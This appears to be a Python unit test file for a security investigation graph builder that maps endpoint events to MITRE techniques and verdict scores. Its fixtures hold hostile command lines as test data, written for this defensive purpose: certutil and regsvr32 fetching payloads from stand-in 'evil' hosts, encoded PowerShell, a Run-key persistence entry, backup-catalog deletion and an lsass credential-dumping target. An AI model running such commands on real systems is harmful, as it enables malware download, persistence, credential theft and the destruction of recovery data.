"""Unit tests for the Investigation Knowledge Graph (IKG) + builder."""
from __future__ import annotations
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # /app/backend

from v2.investigation import (
    build_investigation, InvestigationKnowledgeGraph, Node,
    VALID_NODE_TYPES, VALID_EDGE_TYPES,
)


def _f(fid, ts, lane, label, cmdline="", mitre=None, action=None,
       target=None, rule_id=None):
    return {
        "frame_iid": fid, "ts": ts, "lane": lane, "label": label,
        "action":  action or cmdline or label, "cmdline": cmdline,
        "target":  target, "mitre":  mitre or [], "rule_id": rule_id,
    }


# ═══ IKG raw structure ═════════════════════════════════════════════════

def test_ikg_rejects_invalid_node_types():
    g = InvestigationKnowledgeGraph(case_id="x")
    try:
        g.add_node(Node(id="a", type="bogus", label="x"))
    except ValueError:
        return
    raise AssertionError("expected ValueError on invalid node type")


def test_ikg_dedupes_edges():
    g = InvestigationKnowledgeGraph(case_id="x")
    g.add_node(Node(id="a", type="process", label="a"))
    g.add_node(Node(id="b", type="process", label="b"))
    e1 = g.add_edge("a", "b", "spawned")
    e2 = g.add_edge("a", "b", "spawned")
    assert e1 is not None and e2 is None
    assert len(g.edges) == 1


def test_ikg_add_edge_returns_none_when_endpoint_missing():
    g = InvestigationKnowledgeGraph(case_id="x")
    g.add_node(Node(id="a", type="process", label="a"))
    assert g.add_edge("a", "missing", "spawned") is None


def test_ikg_stats_by_type_counts():
    g = InvestigationKnowledgeGraph(case_id="x")
    g.add_node(Node(id="a", type="process", label="a"))
    g.add_node(Node(id="b", type="process", label="b"))
    g.add_node(Node(id="c", type="file",    label="c"))
    g.add_edge("a", "b", "spawned")
    g.add_edge("a", "c", "created")
    s = g.stats()
    assert s["by_node_type"]["process"] == 2
    assert s["by_node_type"]["file"] == 1
    assert s["by_edge_type"]["spawned"] == 1
    assert s["by_edge_type"]["created"] == 1
    assert s["nodes"] == 3 and s["edges"] == 2


# ═══ Builder end-to-end ════════════════════════════════════════════════

def test_builder_emits_header_and_ikg():
    frames = [
        _f("f1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAA",
           mitre=["T1027", "T1059"]),
        _f("f2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://evil/payload", mitre=["T1105"]),
    ]
    inv = build_investigation(frames, case_id="caseX")
    assert inv.case_id == "caseX"
    assert inv.header["device_score"] > 0
    assert inv.header["verdict_band"] in ("suspicious", "malicious", "critical", "low")
    assert inv.header["event_count"] == 2

    ikg = inv.ikg
    # Every event has a node.
    n_by_type = ikg["stats"]["by_node_type"]
    assert n_by_type["event"] == 2
    # Device + incident anchors present.
    assert n_by_type["device"] == 1
    assert n_by_type["incident"] == 1
    # Techniques created for each MITRE tag.
    assert n_by_type.get("technique", 0) >= 3

    # Edge types include the structural verbs we expect.
    e_by_type = ikg["stats"]["by_edge_type"]
    assert "hosted_on" in e_by_type
    assert "part_of" in e_by_type
    assert "executed_by" in e_by_type
    assert "maps_to" in e_by_type
    # Verdict rollup edges chain up through the hierarchy.
    assert e_by_type["contributes_to"] >= 1


def test_builder_deterministic_across_runs():
    frames = [
        _f("d1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1027"]),
        _f("d2", "2026-02-24T10:00:05Z", "registry", "reg add",
           target=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\bd",
           mitre=["T1547"]),
    ]
    a = build_investigation([dict(f) for f in frames], case_id="det").to_dict()
    for _ in range(20):
        b = build_investigation([dict(f) for f in frames], case_id="det").to_dict()
        assert a["header"] == b["header"]
        assert a["ikg"]["stats"] == b["ikg"]["stats"]
        assert a["verdicts"]["device"]["score"] == b["verdicts"]["device"]["score"]


def test_builder_process_spawn_edges_present():
    """A process spawning another should produce a `spawned` edge in the IKG."""
    frames = [
        _f("p1", "2026-02-24T10:00:00Z", "process", "winword.exe",
           cmdline="WINWORD.EXE Invoice.docm"),
        _f("p2", "2026-02-24T10:00:05Z", "process", "regsvr32.exe",
           cmdline="regsvr32 /s /n /u /i:http://evil.tld/a.sct scrobj.dll",
           mitre=["T1218"]),
    ]
    inv = build_investigation(frames, case_id="spawn")
    e_by_type = inv.ikg["stats"]["by_edge_type"]
    assert e_by_type.get("spawned", 0) >= 1, e_by_type


def test_builder_verdict_hierarchy_edges():
    """Verdict nodes rollup edges: incident←device←chain←process."""
    frames = [
        _f("v1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAA", mitre=["T1027"]),
        _f("v2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://x/", mitre=["T1105"]),
        _f("v3", "2026-02-24T10:00:10Z", "process", "wbadmin.exe",
           cmdline="wbadmin delete catalog -quiet", mitre=["T1490"]),
    ]
    inv = build_investigation(frames, case_id="hier")
    e_by_type = inv.ikg["stats"]["by_edge_type"]
    assert e_by_type.get("rollup_of", 0) >= 2  # incident←device, device←chain(s)
    assert e_by_type.get("contributes_to", 0) >= 2

    # Verdict nodes should exist at multiple layers.
    verdict_nodes = [n for n in inv.ikg["nodes"] if n["type"] == "verdict"]
    layers = {n["attrs"]["layer"] for n in verdict_nodes}
    assert {"device", "incident"}.issubset(layers), layers


def test_builder_profile_flows_through_to_verdict():
    frames = [
        _f("pr1", "2026-02-24T10:00:00Z", "process", "unknown.exe",
           cmdline="unknown --target lsass", mitre=["T1003"]),
    ]
    soc  = build_investigation(frames, case_id="p", profile="soc_balanced").header["device_score"]
    dfir = build_investigation(frames, case_id="p", profile="dfir").header["device_score"]
    assert dfir >= soc  # DFIR boosts credential signals


def test_engine_version_reported():
    inv = build_investigation([], case_id="empty")
    ev = inv.engine_version
    for key in ("ikg", "irg", "verdict", "correlation", "investigation_builder"):
        assert key in ev, ev


if __name__ == "__main__":
    fns = [(n, f) for n, f in list(globals().items()) if n.startswith("test_")]
    ok, fail = 0, 0
    for name, fn in fns:
        try:
            fn()
            print(f"  ✓ {name}")
            ok += 1
        except AssertionError as e:
            print(f"  ✗ {name} · {e}")
            fail += 1
        except Exception as e:
            print(f"  ✗ {name} · {type(e).__name__}: {e}")
            fail += 1
    print(f"\n{ok}/{ok+fail} passed")
    sys.exit(0 if fail == 0 else 1)
